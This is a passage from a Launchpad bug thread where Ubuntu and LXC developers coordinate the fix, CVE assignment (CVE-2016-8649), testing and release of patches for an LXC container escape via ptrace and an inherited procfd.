I'm going to be mostly unavailable between the 28th and 30th and then again between the 5th and 9th so would rather avoid those days.

As usual, the plan will be for upstream LXC to push out security releases for the two supported branches as well as handle the announcement. So I'll be tagging LXC 1.0.9 and LXC 2.0.6 containing only this one fix on top of the latest stable release (1.0.8 and 2.0.5 respectively).

For Ubuntu, that means:

 - precise-backports: update to 1.0.9

 - trusty: update to 1.0.9

 - xenial: update to 2.0.6

 - yakkety: update to 2.0.6

 - zesty: update to 2.0.6

Once we've had a few more eyes on the proposed patch and have a CRD set in stone, I'll push all of the above in the private LXC security PPA, then on the CRD, the security team (or I) can just copy all of that stuff in the archive.

Ok, so on the topic of CVE assignation, I've been going back and forth on this throughout the day.
Ultimately the security issue is with the kernel and Eric's patch fixes that, that in my mind is the real CVE worthy issue here.
On the LXC side of things, the current implementation of procfd allows an attacker to get a dirfd to the host's /proc which then allows escaping to the host's filesystem and ultimately completely escaping from the container.
Christian's fix restricts that exposure to just the apparmor label switching interface, making it still possible for an attacker in the container to alter the apparmor profile of the joining task.
That's still a security problem, but much less worse than a privileged escalation (in the case of a privileged attach process) and full container escape.
So as it stands, I think we'll want a CVE for the LXC side of this as even without the related kernel fix, the proposed fix does make things massively better by turning a privilege escalation + container escape issue into "just" an apparmor bypass issue.
As far as CRD, assuming we're all happy with the proposed fix. Anytime next week would be fine with me. If that's not an option, then the 1st or 2nd of December would work too.
I'm going to be mostly unavailable between the 28th and 30th and then again between the 5th and 9th so would rather avoid those days.
As usual, the plan will be for upstream LXC to push out security releases for the two supported branches as well as handle the announcement. So I'll be tagging LXC 1.0.9 and LXC 2.0.6 containing only this one fix on top of the latest stable release (1.0.8 and 2.0.5 respectively).
For Ubuntu, that means:
- precise-backports: update to 1.0.9
- trusty: update to 1.0.9
- xenial: update to 2.0.6
- yakkety: update to 2.0.6
- zesty: update to 2.0.6
Once we've had a few more eyes on the proposed patch and have a CRD set in stone, I'll push all of the above in the private LXC security PPA, then on the CRD, the security team (or I) can just copy all of that stuff in the archive.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-15: |  |  | [#33](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/33) |
| --- | --- | --- | --- |

Oh, forgot trusty-backports in the list above, that'll be a backport of 2.0.6.

Oh, forgot trusty-backports in the list above, that'll be a backport of 2.0.6.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-15: |  |  | [#34](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/34) |
| --- | --- | --- | --- |

On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.

We've applied Eric's patch as the "upstream replacement" to the sauce patch we've been carrying, and it's included in the current SRU cycle, which is due to be released to -updates on Nov 28 if there are no problems.

On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.
We've applied Eric's patch as the "upstream replacement" to the sauce patch we've been carrying, and it's included in the current SRU cycle, which is due to be released to -updates on Nov 28 if there are no problems.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2016-11-16: |  |  | [#35](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/35) |
| --- | --- | --- | --- |

Patch looks good to me, thanks.

Patch looks good to me, thanks.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Luis Henriques (henrix)](https://launchpad.net/~henrix) wrote on 2016-11-16: |  |  | [#36](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/36) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-vivid' to 'verification-done-vivid'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-vivid' to 'verification-done-vivid'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

| **tags**: | added: verification-needed-vivid |
| --- | --- |
| **tags**: | added: verification-needed-xenial |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Luis Henriques (henrix)](https://launchpad.net/~henrix) wrote on 2016-11-16: |  |  | [#37](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/37) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-xenial' to 'verification-done-xenial'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-xenial' to 'verification-done-xenial'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Luis Henriques (henrix)](https://launchpad.net/~henrix) wrote on 2016-11-16: |  |  | [#38](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/38) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-yakkety' to 'verification-done-yakkety'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-yakkety' to 'verification-done-yakkety'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

| **tags**: | added: verification-needed-yakkety |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-16: |  |  | [#39](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/39) |
| --- | --- | --- | --- |

> On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.

Isn't that subverting the idea behind CVEs? It seems Redhat is already patched against that vulnerability:

<https://bugzilla.redhat.com/show_bug.cgi?id=1295287>

Fedora Update System 2016-02-01 01:23:43 EST

kernel-4.3.4-200.fc22 has been pushed to the Fedora 22 stable repository. If problems still persist, please make note of it in this bug report.

So basically they would have to reopen the issue and patch the same vuln again, although first patch was complete?

Or should we just accept that and wait for the first system to appear that is patched for CVE-2015-8709-A and not for CVE-2015-8709-B and then split the old entry into two?

> On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.
Isn't that subverting the idea behind CVEs? It seems Redhat is already patched against that vulnerability:
https://bugzilla.redhat.com/show\_bug.cgi?id=1295287
Fedora Update System 2016-02-01 01:23:43 EST
kernel-4.3.4-200.fc22 has been pushed to the Fedora 22 stable repository. If problems still persist, please make note of it in this bug report.
So basically they would have to reopen the issue and patch the same vuln again, although first patch was complete?
Or should we just accept that and wait for the first system to appear that is patched for CVE-2015-8709-A and not for CVE-2015-8709-B and then split the old entry into two?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-16: |  |  | [#40](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/40) |
| --- | --- | --- | --- |

On 11/15/2016 04:59 PM, Seth Forshee wrote:

> On the kernel side there was previously a CVE assigned for the ptrace

> issue - CVE-2015-8709. That restricted ptrace if the real, effective,

> and saved uids and gids of the process were not mapped into the ptracing

> process's user ns, but that doesn't forbid ptrace under the

> circumstances here.

Please don't reuse that CVE ID for this issue. It is clearly a different

issue and reusing the CVE ID will only confuse everyone.

On 11/15/2016 04:59 PM, Seth Forshee wrote:
> On the kernel side there was previously a CVE assigned for the ptrace
> issue - CVE-2015-8709. That restricted ptrace if the real, effective,
> and saved uids and gids of the process were not mapped into the ptracing
> process's user ns, but that doesn't forbid ptrace under the
> circumstances here.
Please don't reuse that CVE ID for this issue. It is clearly a different
issue and reusing the CVE ID will only confuse everyone.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-16: |  |  | [#41](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/41) |
| --- | --- | --- | --- |

Also my opinion. I just was wondering, because with that note, I was citing, also the CVE-2015-8709 reference seems to be added to this issue. I interpreted that as an attemt to reuse. If not, so why reference it, when it does not have something to do with it? For citing similar issues, should reference in note not be sufficient (Perhaps default behaviour of Launchpad software, would it add CVE-1970-0001 when just naming it?)

Also my opinion. I just was wondering, because with that note, I was citing, also the CVE-2015-8709 reference seems to be added to this issue. I interpreted that as an attemt to reuse. If not, so why reference it, when it does not have something to do with it? For citing similar issues, should reference in note not be sufficient (Perhaps default behaviour of Launchpad software, would it add CVE-1970-0001 when just naming it?)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-16: |  |  | [#42](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/42) |
| --- | --- | --- | --- |

On Wed, Nov 16, 2016 at 04:06:26PM -0000, Tyler Hicks wrote:

> On 11/15/2016 04:59 PM, Seth Forshee wrote:

> > On the kernel side there was previously a CVE assigned for the ptrace

> > issue - CVE-2015-8709. That restricted ptrace if the real, effective,

> > and saved uids and gids of the process were not mapped into the ptracing

> > process's user ns, but that doesn't forbid ptrace under the

> > circumstances here.

>

> Please don't reuse that CVE ID for this issue. It is clearly a different

> issue and reusing the CVE ID will only confuse everyone.

Sorry, I didn't really say what I meant to say there. Let me try again.

The patch does fix CVE-2015-8709. We aren't "reusing" it. We're

replacing a sauce patch to fix that CVE with a (better) upstream patch,

which is what we normally do when an upstream fix becomes available.

You're right that the ptrace issue here is different than the one

described by that CVE. Maybe that warrants another CVE, I'm not making

claims either way about that. All I meant to say is that we've already

taken the patch from Eric as an upstream replacement for the previous

patch to fix CVE-2015-8709.

On Wed, Nov 16, 2016 at 04:06:26PM -0000, Tyler Hicks wrote:
> On 11/15/2016 04:59 PM, Seth Forshee wrote:
> > On the kernel side there was previously a CVE assigned for the ptrace
> > issue - CVE-2015-8709. That restricted ptrace if the real, effective,
> > and saved uids and gids of the process were not mapped into the ptracing
> > process's user ns, but that doesn't forbid ptrace under the
> > circumstances here.
>
> Please don't reuse that CVE ID for this issue. It is clearly a different
> issue and reusing the CVE ID will only confuse everyone.
Sorry, I didn't really say what I meant to say there. Let me try again.
The patch does fix CVE-2015-8709. We aren't "reusing" it. We're
replacing a sauce patch to fix that CVE with a (better) upstream patch,
which is what we normally do when an upstream fix becomes available.
You're right that the ptrace issue here is different than the one
described by that CVE. Maybe that warrants another CVE, I'm not making
claims either way about that. All I meant to say is that we've already
taken the patch from Eric as an upstream replacement for the previous
patch to fix CVE-2015-8709.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-17: |  |  | [#43](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/43) |
| --- | --- | --- | --- |

FYI, updated ptrace patchset by Eric, sent for inclusion: <https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html>

FYI, updated ptrace patchset by Eric, sent for inclusion: https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-17: |  |  | [#44](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/44) |
| --- | --- | --- | --- |

On Thu, Nov 17, 2016 at 05:45:30PM -0000, Stéphane Graber wrote:

> FYI, updated ptrace patchset by Eric, sent for inclusion:

> <https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html>

Note that these are follow-ups to the other patch (mm: Add a user\_ns

owner to mm\_struct and fix ptrace permission checks), not replacements.

As far as I can tell they address different issues than those under

discussion here.

On Thu, Nov 17, 2016 at 05:45:30PM -0000, Stéphane Graber wrote:
> FYI, updated ptrace patchset by Eric, sent for inclusion:
> https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html
Note that these are follow-ups to the other patch (mm: Add a user\_ns
owner to mm\_struct and fix ptrace permission checks), not replacements.
As far as I can tell they address different issues than those under
discussion here.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-18: |  |  | [#45](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/45) |
| --- | --- | --- | --- |

The LXC issue of passing the procfd to the attached process has been assigned CVE-2016-8649.

The LXC issue of passing the procfd to the attached process has been assigned CVE-2016-8649.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-18: |  |  | [#46](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/46) |
| --- | --- | --- | --- |

@brauner: Can you provide a version of your patch for both stable-1.0 and stable-2.0 branches as they stand today (other than the CVE fix, they're ready for the point release).

@brauner: Can you provide a version of your patch for both stable-1.0 and stable-2.0 branches as they stand today (other than the CVE fix, they're ready for the point release).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-18: |  |  | [#47](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/47) |
| --- | --- | --- | --- |

* [LXC patch for master.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779383/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779383)
  (14.8 KiB,
  text/plain)

LXC patch for master.

LXC patch for master.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-18: |  |  | [#48](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/48) |
| --- | --- | --- | --- |

* [LXC patch for stable-2.0.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779384/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process_stable-2.0.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779384)
  (15.3 KiB,
  text/plain)

LXC patch for stable-2.0.

LXC patch for stable-2.0.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-18: |  |  | [#49](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/49) |
| --- | --- | --- | --- |

* [LXC patch for stable-1.0.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779385/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process_stable-1.0.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779385)
  (15.4 KiB,
  text/plain)

LXC patch for stable-1.0.

LXC patch for stable-1.0.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-22: |  |  | [#50](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/50) |
| --- | --- | --- | --- |

Packages for all Ubuntu releases have been uploaded to the LXC security PPA: [https://launchpad.net/~ubuntu-lxc-security/+archive/ubuntu/devirt-security/+packages](https://launchpad.net/~ubuntu-lxc-security/%2Barchive/ubuntu/devirt-security/%2Bpackages)

Packages for all Ubuntu releases have been uploaded to the LXC security PPA: https://launchpad.net/~ubuntu-lxc-security/+archive/ubuntu/devirt-security/+packages

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-22: |  |  | [#51](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/51) |
| --- | --- | --- | --- |

I tested packages for all Ubuntu releases and they seem to work fine. I can start privileged and unprivileged containers and attach to them without any further problems. I tested this inside of proper virtual machines with low-level LXC and nesting with LXD.

I tested packages for all Ubuntu releases and they seem to work fine. I can start privileged and unprivileged containers and attach to them without any further problems. I tested this inside of proper virtual machines with low-level LXC and nesting with LXD.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-22: |  |  | [#52](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/52) |
| --- | --- | --- | --- |

I've tested the {yakkety,xenial,trusty}-{i386,amd64} packages by doing upgrade testing and also tested lxc-{create,start,ls,info,attach,stop,destroy} with privileged and unprivileged containers. All testing went as expected.

I also compared the amd64 build logs between what's currently in -updates and the binary packages built in the PPA. They're all clean.

I'll publish to {yakkety,xenial,trusty}-security on the CRD tomorrow and then publish a USN. Thanks to you all!

I've tested the {yakkety,xenial,trusty}-{i386,amd64} packages by doing upgrade testing and also tested lxc-{create,start,ls,info,attach,stop,destroy} with privileged and unprivileged containers. All testing went as expected.
I also compared the amd64 build logs between what's currently in -updates and the binary packages built in the PPA. They're all clean.
I'll publish to {yakkety,xenial,trusty}-security on the CRD tomorrow and then publish a USN. Thanks to you all!

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-23: |  |  | [#53](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/53) |
| --- | --- | --- | --- |

I've verified the ptrace fix in all -proposed kernels.

I've verified the ptrace fix in all -proposed kernels.

| **tags**: | added: verification-done-trusty verification-done-vivid verification-done-xenial verification-done-yakketyremoved: verification-needed-trusty verification-needed-vivid verification-needed-xenial verification-needed-yakkety |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#54](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/54) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 1.0.8-0ubuntu0.4

---------------

lxc (1.0.8-0ubuntu0.4) trusty-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 1.0.8-0ubuntu0.4
---------------
lxc (1.0.8-0ubuntu0.4) trusty-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu Trusty): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#55](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/55) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 2.0.5-0ubuntu1.2

---------------

lxc (2.0.5-0ubuntu1.2) yakkety-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 2.0.5-0ubuntu1.2
---------------
lxc (2.0.5-0ubuntu1.2) yakkety-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu Yakkety): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#56](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/56) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 1.1.5-0ubuntu0.15.04.4

---------------

lxc (1.1.5-0ubuntu0.15.04.4) vivid-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 1.1.5-0ubuntu0.15.04.4
---------------
lxc (1.1.5-0ubuntu0.15.04.4) vivid-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#57](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/57) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 2.0.5-0ubuntu1~ubuntu16.04.3

---------------

lxc (2.0.5-0ubuntu1~ubuntu16.04.3) xenial-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 2.0.5-0ubuntu1~ubuntu16.04.3
---------------
lxc (2.0.5-0ubuntu1~ubuntu16.04.3) xenial-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu Xenial): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#58](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/58) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 2.0.5-0ubuntu4

---------------

lxc (2.0.5-0ubuntu4) zesty-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 2.0.5-0ubuntu4
---------------
lxc (2.0.5-0ubuntu4) zesty-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu): | |
| --- | --- |
| **status**: | Triaged → Fix Released |

[Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks)
on 2016-11-23

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brad Figg (brad-figg)](https://launchpad.net/~brad-figg) wrote on 2016-11-23:  [**Missing required logs.**](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/59) |  |  | [#59](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/59) |
| --- | --- | --- | --- |

This bug is missing log files that will aid in diagnosing the problem. From a terminal window please run:

apport-collect 1639345

and then change the status of the bug to 'Confirmed'.

If, due to the nature of the issue you have encountered, you are unable to run this command, please add a comment stating that fact and change the bug status to 'Confirmed'.

This change has been made by an automated script, maintained by the Ubuntu Kernel Team.

This bug is missing log files that will aid in diagnosing the problem. From a terminal window please run:
apport-collect 1639345
and then change the status of the bug to 'Confirmed'.
If, due to the nature of the issue you have encountered, you are unable to run this command, please add a comment stating that fact and change the bug status to 'Confirmed'.
This change has been made by an automated script, maintained by the Ubuntu Kernel Team.

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | New → Incomplete |

[Stéphane Graber (stgraber)](https://launchpad.net/~stgraber)
on 2016-11-23

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | Incomplete → New |
| **tags**: | added: bot-stop-nagging |

[Brad Figg (brad-figg)](https://launchpad.net/~brad-figg)
on 2016-11-23

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | New → Incomplete |

[Stéphane Graber (stgraber)](https://launchpad.net/~stgraber)
on 2016-11-23

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | Incomplete → Triaged |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Steve Langasek (vorlon)](https://launchpad.net/~vorlon) wrote on 2016-11-30:  [**Update Released**](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/61) |  |  | [#61](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/61) |
| --- | --- | --- | --- |

The verification of the Stable Release Update for linux-lts-trusty has completed successfully and the package has now been released to -updates. Subsequently, the Ubuntu Stable Release Updates Team is being unsubscribed and will not receive messages about this bug report. In the event that you encounter a regression using the package from -updates please report a new bug using ubuntu-bug and tag the bug report regression-update so we can easily find any regressions.

The verification of the Stable Release Update for linux-lts-trusty has completed successfully and the package has now been released to -updates. Subsequently, the Ubuntu Stable Release Updates Team is being unsubscribed and will not receive messages about this bug report. In the event that you encounter a regression using the package from -updates please report a new bug using ubuntu-bug and tag the bug report regression-update so we can easily find any regressions.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-30: |  |  | [#62](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/62) |
| --- | --- | --- | --- |

This bug was fixed in the package linux - 3.13.0-103.150

---------------

linux (3.13.0-103.150) trusty; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1644489](/bugs/1644489)

\* Possible regression on 3.13.0-102.149~precise1 x86\_64 (gce) (LP: [#1644302](/bugs/1644302))

    - SAUCE: apparmor: delete extra variable dev\_path

linux (3.13.0-102.149) trusty; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1640581](/bugs/1640581)

\* lxc-attach to malicious container allows access to host (LP: [#1639345](/bugs/1639345))

    - Revert "UBUNTU: ptrace: being capable wrt a process requires mapped

      uids/gids"

    - (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission

      checks

\* Syntax error extra parenthesis linux-headers-3.13.0-100/Makefile

    (LP: [#1636625](/bugs/1636625))

    - Makefile: fix extra parenthesis typo when CC\_STACKPROTECTOR\_REGULAR is

      enabled

\* Add a driver for Amazon Elastic Network Adapters (ENA) (LP: [#1635721](/bugs/1635721))

    - lib/bitmap.c: conversion routines to/from u32 array

    - kernel.h: define u8, s8, u32, etc. limits

    - net: ethtool: add new ETHTOOL\_xLINKSETTINGS API

    - PCI/MSI: Add pci\_msix\_vec\_count()

    - etherdevice: Use ether\_addr\_copy to copy an Ethernet address

    - net: ena: Add a driver for Amazon Elastic Network Adapters (ENA)

    - [config] enable CONFIG\_ENA\_ETHERNET=m (Amazon ENA driver)

\* CVE-2016-8658

    - brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()

\* CVE-2016-7425

    - scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()

\* srcname from mount rule corrupted under load (LP: [#1634753](/bugs/1634753))

